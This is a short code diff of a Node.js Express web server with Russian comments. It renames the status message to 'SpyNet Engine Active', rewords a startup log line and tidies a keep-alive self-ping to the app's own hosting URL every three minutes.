+// 🌐 ВЕБ-СЕРВЕР И АВТО-ПИНГ
 // ====================================================================
 const app = express();
-app.get('/', (req, res) => res.send('Post AI Analytics Engine Active'));
-
+app.get('/', (req, res) => res.send('SpyNet Engine Active'));
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`[Executive Server] Запущен на порту: ${PORT}`);
+    console.log(`[Executive Server] Системный хаб развернут на порту: ${PORT}`);
     setInterval(() => {
         const url = process.env.RENDER_EXTERNAL_URL;
-        if (url) {
-            axios.get(url).catch(() => {});
-        }
+        if (url) axios.get(url).catch(() => {});
     }, 180000);
 });
